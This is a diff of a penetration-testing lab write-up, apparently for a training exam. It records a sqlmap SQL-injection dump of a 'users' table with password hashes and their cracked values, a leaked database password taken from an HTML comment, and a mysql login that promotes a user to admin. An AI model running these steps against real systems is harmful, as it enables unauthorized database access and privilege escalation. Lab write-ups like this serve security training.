@@ -225,18 +225,29 @@ mysql --host=172.16.64.92 --user=fcadmin1 --password=c5d71f305bb017a66c5fa7fd665
 
 ```text
 sqlmap -u 'http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id=6' -D footracking -T users --dump
-Database: footracking
+Database: footracking                                                                                                                
 Table: users
 [4 entries]
-+----+-----+----------------------------------+-----------+
-| id | adm | password                         | username  |
-+----+-----+----------------------------------+-----------+
-| 1  | yes | c5d71f305bb017a66c5fa7fd66535b84 | fcadmin1  |
-| 2  | yes | 14d69ee186f8d9bbeddd4da31559ce0f | fcadmin2  |
-| 3  | no  | 827ccb0eea8a706c4c34a16891f84e7b | tracking1 |
-| 4  | no  | e10adc3949ba59abbe56e057f20f883e | tracking2 |
-+----+-----+----------------------------------+-----------+    
++----+-----+-------------------------------------------+-----------+
+| id | adm | password                                  | username  |
++----+-----+-------------------------------------------+-----------+
+| 1  | yes | c5d71f305bb017a66c5fa7fd66535b84          | fcadmin1  |
+| 2  | yes | 14d69ee186f8d9bbeddd4da31559ce0f          | fcadmin2  |
+| 3  | no  | 827ccb0eea8a706c4c34a16891f84e7b (12345)  | tracking1 |
+| 4  | no  | e10adc3949ba59abbe56e057f20f883e (123456) | tracking2 |
++----+-----+-------------------------------------------+-----------+
 ```
 
 ![](../.gitbook/assets/image%20%287%29.png)
+
+![](../.gitbook/assets/image%20%288%29.png)
+
+```text
+<!-- = '127.0.0.1'; = 'dbuser'; = 'xXxyYyzZz789789)))'; = 'footracking'; = mysqli_connect(, , , );-->
+```
+
+```text
+mysql --host=172.16.64.92 --user=dbuser --password=xXxyYyzZz789789))) --port 63306 footracking
+> update users set adm='yes' where id=3;
+```
 
